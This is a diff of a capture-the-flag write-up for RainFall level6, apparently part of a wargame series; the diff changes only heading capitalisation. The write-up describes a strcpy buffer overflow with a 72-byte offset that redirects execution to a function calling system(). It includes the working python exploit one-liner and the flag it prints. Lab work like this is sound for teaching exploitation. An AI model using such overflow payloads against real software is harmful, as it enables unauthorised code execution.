@@ -1,6 +1,6 @@
-# Level6
+# level6
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level6@RainFall:~$ ./level6
 Segmentation fault (core dumped)
@@ -100,7 +100,7 @@ We observe that the function <code>n()</code> invokes <code>system()</code>, ind
 ## buffer overflow
 We observed that <code>main()</code> utilizes <code>strcpy()</code>, a function known to be vulnerable to <code>buffer overflow</code> attacks. Consequently, we proceed as previously by determining the buffer offset value, which is determined to be 72. With this information, we can exploit the vulnerability to call the function <code>n()</code> by passing its address (<code>0x08048454</code>).
 
-## Exploit
+## exploit
 ``` shell
 level6@RainFall:~$ ./level6 $(python -c 'print "F" * 72 + "\x08\x04\x84\x54"[::-1]')
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
